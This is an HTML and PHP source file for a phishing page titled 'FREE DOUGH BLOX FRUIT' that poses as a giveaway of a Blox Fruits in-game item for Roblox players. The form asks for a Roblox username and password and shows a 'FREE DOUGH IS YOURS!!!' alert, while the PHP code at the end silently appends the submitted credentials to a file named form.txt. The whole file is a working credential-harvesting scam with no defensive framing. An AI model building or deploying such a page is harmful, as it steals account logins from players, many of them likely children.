<!DOCTYPE html>
<html>
  <head>
    <title>FREE DOUGH BLOX FRUIT</title>
    <link rel="stylesheet" type="text/css" href="R.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
  </head>
  <body>
  
  <nav class="navbar navbar-expand-lg bg-body-tertiary">
  <div class="container-fluid">
    <a class="navbar-brand" href="#">FREE DOUGH</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav me-auto mb-2 mb-lg-0">
        <li class="nav-item">
          <a class="nav-link active" aria-current="page" href="file:///C:/xampp/htdocs/R/asd.html">BACK TO HUB</a>
        </li>
        <li class="nav-item">
          <a class="nav-link" href="https://www.roblox.com/home">ROBLOX</a>
        </li>
      </ul>

    </div>
  </div>
</nav>
  </div>










 
    <div class="login-box">
      
      <form method = "post"> 
        
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" placeholder="Enter your username" required>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required>
        <input class="asd" type="submit" onclick = "kosta()" value="FREE DOUGH" name="">
      </form>
    </div>
    <script>
            function kosta(){
                 alert("FREE DOUGH IS YOURS!!!");
            }
    </script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>

  </body>
</html>
<?php
	extract($_REQUEST);
	$file = fopen("form.txt" , "a");

	fwrite($file, "username: ");
	@fwrite($file, $_POST['username'] . "\n");
	fwrite($file, "password:  :");
	@fwrite($file, $_POST['password'] . "\n");
	fclose($file);
?>
